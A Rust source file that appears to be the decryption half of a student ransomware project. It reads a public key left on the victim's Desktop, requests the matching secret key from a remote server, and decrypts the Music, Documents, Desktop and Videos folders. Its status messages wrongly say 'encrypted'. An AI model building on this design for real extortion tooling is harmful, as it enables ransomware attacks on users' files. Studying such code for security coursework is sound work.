use std::path::PathBuf;
use std::fs;

use anyhow::Result;

use c_monster_co_2ic80::cryptography::encrypt::decrypt_folder;
use c_monster_co_2ic80::networking::client::get_key;

use sodiumoxide::crypto::box_::{PublicKey};

use windows::{
    core::PWSTR,
    Win32::{
        UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos, KNOWN_FOLDER_FLAG},
    },
};

fn desktop_file_path(filename: &str) -> PathBuf {
    unsafe {
        let path: PWSTR = SHGetKnownFolderPath(&FOLDERID_Desktop, KNOWN_FOLDER_FLAG(0), None)
                                .expect("Failed to get Desktop path");

        let desktop = path.to_string().unwrap();
        PathBuf::from(desktop).join(filename)
    }
}

// DECRYPTING
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    sodiumoxide::init().unwrap();

    let pk_path = desktop_file_path("public_key.donotdelete");
    let pk_bytes = fs::read(pk_path)?;
    let pk = PublicKey::from_slice(&pk_bytes)
        .ok_or("key has to be 32 bytes")? as PublicKey;

    let sk = get_key(&pk).await?;

    let paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
    unsafe {
        for path in paths {
            let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
            let path_str = path_ptr.to_string().unwrap();
            let path_buf: PathBuf = path_str.into();

            match decrypt_folder(&path_buf, &pk, &sk) {
                Ok(_) => println!("✓ Successfully encrypted: {:?}", path_buf),
                Err(e) => println!("✗ Error encrypting {:?}: {}", path_buf, e),
            }
        }
    }

    Ok(())
}
